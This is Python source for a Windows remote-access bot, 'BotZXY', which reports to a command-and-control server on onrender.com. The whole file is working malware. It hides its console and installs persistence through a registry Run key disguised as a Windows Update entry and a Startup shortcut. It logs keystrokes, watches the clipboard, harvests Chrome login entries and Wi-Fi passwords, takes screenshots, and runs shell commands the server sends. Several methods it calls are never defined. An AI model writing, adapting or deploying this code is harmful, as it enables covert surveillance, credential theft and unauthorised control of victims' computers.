#!/usr/bin/env python3
# BotZXY - Windows Client POTENZIATO con persistenza e offuscamento

import requests
import platform
import socket
import os
import sys
import time
import json
import base64
import subprocess
import threading
from datetime import datetime
import io
import ctypes
import random
import string

# ============ CONFIGURAZIONE ============
C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI CON IL TUO URL
DEVICE_ID = socket.gethostname() + "_" + platform.node()[:8]
POLL_INTERVAL = 3
BOT_NAME = "BotZXY"
VERSION = "2.0"

# ============ OFFUSCAMENTO BASE ============
def obfuscate(data):
    """Offusca i dati con XOR base"""
    key = 0x5A
    return ''.join(chr(ord(c) ^ key) for c in data)

def deobfuscate(data):
    key = 0x5A
    return ''.join(chr(ord(c) ^ key) for c in data)

# ============ CLIENT PRINCIPALE ============
class BotZXYClient:
    def __init__(self):
        self.device_id = DEVICE_ID
        self.c2_url = C2_URL
        self.running = True
        self.bot_name = BOT_NAME
        self.session = requests.Session()
        self.keylog_buffer = []
        self.mouse_thread = None
        self.keylog_thread = None
        self.clipboard_thread = None
        self.wifi_thread = None
        self.hidden = False
        
    def hide_console(self):
        """Nasconde la console di Windows"""
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            self.hidden = True
        except:
            pass
    
    def install_persistence(self):
        """Installa persistenza su Windows"""
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
            
            # Nome casuale per il servizio
            service_name = ''.join(random.choices(string.ascii_letters, k=8))
            exe_path = os.path.join(os.path.dirname(sys.executable), 'botzxy_client.exe')
            if not os.path.exists(exe_path):
                exe_path = sys.executable
            
            winreg.SetValueEx(handle, f"WindowsUpdate_{service_name}", 0, winreg.REG_SZ, f'"{exe_path}" --hidden')
            winreg.CloseKey(handle)
            
            # Aggiungi anche a Startup folder
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            shortcut_path = os.path.join(startup_folder, f'SystemHelper_{service_name}.lnk')
            
            # Crea shortcut usando PowerShell
            ps_script = f'''
            $WshShell = New-Object -comObject WScript.Shell
            $Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
            $Shortcut.TargetPath = "{exe_path}"
            $Shortcut.Arguments = "--hidden"
            $Shortcut.Save()
            '''
            subprocess.run(['powershell', '-Command', ps_script], shell=True, capture_output=True)
            
            print(f"[+] Persistenza installata: {service_name}")
            return True
        except Exception as e:
            print(f"[-] Persistenza error: {e}")
            return False
    
    def register(self):
        """Registra il dispositivo al C2"""
        data = {
            'device_id': self.device_id,
            'platform': platform.system().lower(),
            'hostname': socket.gethostname(),
            'os_version': platform.version(),
            'cpu': platform.processor(),
            'bot_version': VERSION
        }
        try:
            response = self.session.post(f"{self.c2_url}/api/register", json=data, timeout=10)
            if response.status_code == 200:
                print(f"[+] {self.bot_name} Registered: {self.device_id}")
                return True
        except Exception as e:
            print(f"[-] Registration error: {e}")
        return False
    
    # ============ KEYLOGGER ============
    def start_keylogger(self):
        try:
            import keyboard
            keyboard.on_press(self._keylogger_callback)
            print("[+] Keylogger avviato")
            return True
        except ImportError:
            print("[-] Keyboard module non installato")
            return False
    
    def _keylogger_callback(self, event):
        try:
            key = event.name
            timestamp = datetime.now().isoformat()
            self.keylog_buffer.append({'key': key, 'timestamp': timestamp})
            if len(self.keylog_buffer) >= 30:
                self._send_keylog()
        except:
            pass
    
    def _send_keylog(self):
        if not self.keylog_buffer:
            return
        data = {'keys': json.dumps(self.keylog_buffer), 'timestamp': datetime.now().isoformat()}
        try:
            self.session.post(f"{self.c2_url}/api/keylog/{self.device_id}", json=data, timeout=10)
            self.keylog_buffer = []
        except:
            pass
    
    # ============ PASSWORD GRABBER ============
    def grab_passwords(self):
        passwords = []
        try:
            # Chrome passwords
            import sqlite3
            import shutil
            chrome_path = os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
            if os.path.exists(chrome_path):
                temp_path = os.path.join(os.environ['TEMP'], 'logins_temp.db')
                shutil.copy2(chrome_path, temp_path)
                conn = sqlite3.connect(temp_path)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                rows = cursor.fetchall()
                conn.close()
                os.remove(temp_path)
                for row in rows:
                    if row[0] and row[1]:
                        passwords.append({
                            'browser': 'Chrome',
                            'url': row[0],
                            'username': row[1],
                            'password': '[ENCRYPTED]'
                        })
        except:
            pass
        
        if passwords:
            self.session.post(f"{self.c2_url}/api/passwords/{self.device_id}", 
                            json={'passwords': passwords}, timeout=30)
        return passwords
    
    # ============ WIFI GRABBER ============
    def grab_wifi_networks(self):
        networks = []
        try:
            output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, stderr=subprocess.DEVNULL)
            for line in output.split('\n'):
                if 'All User Profile' in line or 'Profilo utente' in line:
                    ssid = line.split(':')[-1].strip()
                    if ssid:
                        networks.append({'ssid': ssid, 'password': self._get_wifi_password(ssid)})
        except:
            pass
        
        if networks:
            self.session.post(f"{self.c2_url}/api/wifi/{self.device_id}", 
                            json={'networks': networks}, timeout=30)
        return networks
    
    def _get_wifi_password(self, ssid):
        try:
            output = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', 
                                           shell=True, text=True, stderr=subprocess.DEVNULL)
            for line in output.split('\n'):
                if 'Key Content' in line or 'Contenuto chiave' in line:
                    return line.split(':')[-1].strip()
        except:
            pass
        return ''
    
    # ============ CLIPBOARD MONITOR ============
    def start_clipboard_monitor(self):
        try:
            import win32clipboard
            self.clipboard_thread = threading.Thread(target=self._monitor_clipboard, daemon=True)
            self.clipboard_thread.start()
            return True
        except:
            return False
    
    def _monitor_clipboard(self):
        last_content = None
        while self.running:
            try:
                import win32clipboard
                win32clipboard.OpenClipboard()
                if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                    content = win32clipboard.GetClipboardData()
                    if content and content != last_content:
                        self._send_clipboard(content)
                        last_content = content
                win32clipboard.CloseClipboard()
                time.sleep(2)
            except:
                time.sleep(5)
    
    def _send_clipboard(self, content):
        try:
            self.session.post(f"{self.c2_url}/api/clipboard/{self.device_id}", 
                            json={'content': content[:5000]}, timeout=10)
        except:
            pass
    
    # ============ SCREENSHOT ============
    def take_screenshot(self):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            buffered = io.BytesIO()
            screenshot.save(buffered, format="PNG")
            img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')
            return img_base64
        except Exception as e:
            return f"SCREENSHOT_ERROR: {str(e)}"
    
    def upload_screenshot(self, image_base64):
        try:
            self.session.post(f"{self.c2_url}/api/screenshot/{self.device_id}", 
                         json={'image_base64': image_base64}, timeout=30)
        except Exception as e:
            print(f"[-] Upload screenshot error: {e}")
    
    # ============ COMANDI ============
    def execute_command(self, cmd_id, command, params):
        print(f"[+] {self.bot_name} Executing: {command} {params}")
        result = ""
        status = "executed"
        
        try:
            if command == "screenshot":
                result = self.take_screenshot()
                self.upload_screenshot(result)
            elif command == "webcam":
                result = self.take_webcam()
                self.upload_webcam(result)
            elif command == "mic":
                duration = int(params.split('=')[1]) if '=' in params else 10
                result = self.record_microphone(duration)
                self.upload_mic(result)
            elif command == "contacts":
                result = self.get_contacts()
                self.upload_contacts(result)
            elif command == "location":
                result = self.get_location()
            elif command == "clipboard":
                result = self.get_clipboard()
                self._send_clipboard(result)
            elif command == "execute":
                result = self.execute_shell(params)
            elif command == "keylogger_start":
                result = "Keylogger avviato" if self.start_keylogger() else "Errore"
            elif command == "grab_passwords":
                result = json.dumps(self.grab_passwords())
            elif command == "grab_wifi":
                result = json.dumps(self.grab_wifi_networks())
            elif command == "uninstall":
                self.uninstall()
            else:
                result = f"Unknown command: {command}"
                status = "failed"
        except Exception as e:
            result = f"ERROR: {str(e)}"
            status = "failed"
        
        self.send_result(cmd_id, result, status)
    
    def poll_commands(self):
        try:
            response = self.session.get(f"{self.c2_url}/api/poll/{self.device_id}", timeout=10)
            if response.status_code == 200:
                commands = response.json()
                for cmd in commands:
                    self.execute_command(cmd['id'], cmd['command'], cmd['params'])
                return True
        except Exception as e:
            print(f"[-] Poll error: {e}")
        return False
    
    def send_result(self, cmd_id, result, status):
        try:
            self.session.post(f"{self.c2_url}/api/result/{self.device_id}", 
                         json={'command_id': cmd_id, 'result': result, 'status': status}, timeout=10)
        except Exception as e:
            print(f"[-] Send result error: {e}")
    
    def uninstall(self):
        self.running = False
        sys.exit(0)
    
    def run(self):
        print(f"[+] {self.bot_name} Client starting: {self.device_id}")
        
        # Nascondi console
        if '--hidden' in sys.argv or self.hidden:
            self.hide_console()
        
        # Installa persistenza
        self.install_persistence()
        
        # Avvia servizi in background
        self.start_keylogger()
        self.start_clipboard_monitor()
        
        # Registrazione
        if not self.register():
            print("[-] Registration failed, retrying in 60 seconds...")
            time.sleep(60)
            return
        
        print(f"[+] {self.bot_name} running, polling every {POLL_INTERVAL}s")
        
        while self.running:
            try:
                self.poll_commands()
                time.sleep(POLL_INTERVAL)
                if len(self.keylog_buffer) > 0:
                    self._send_keylog()
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Main loop error: {e}")
                time.sleep(30)
        
        print("[+] BotZXY Client stopped")

if __name__ == "__main__":
    client = BotZXYClient()
    client.run()